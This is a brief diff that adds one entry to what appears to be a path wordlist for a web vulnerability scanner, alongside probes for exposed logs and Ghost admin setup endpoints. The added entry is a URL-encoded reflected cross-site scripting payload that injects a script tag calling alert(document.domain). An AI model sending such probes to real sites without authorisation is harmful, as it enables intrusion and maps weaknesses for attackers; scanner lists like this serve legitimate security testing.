@@ -70,3 +70,4 @@
 /storage/logs/web.log
 /ghost/api/admin/authentication/setup/
 /ghost/api/v3/admin/authentication/setup/
+/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
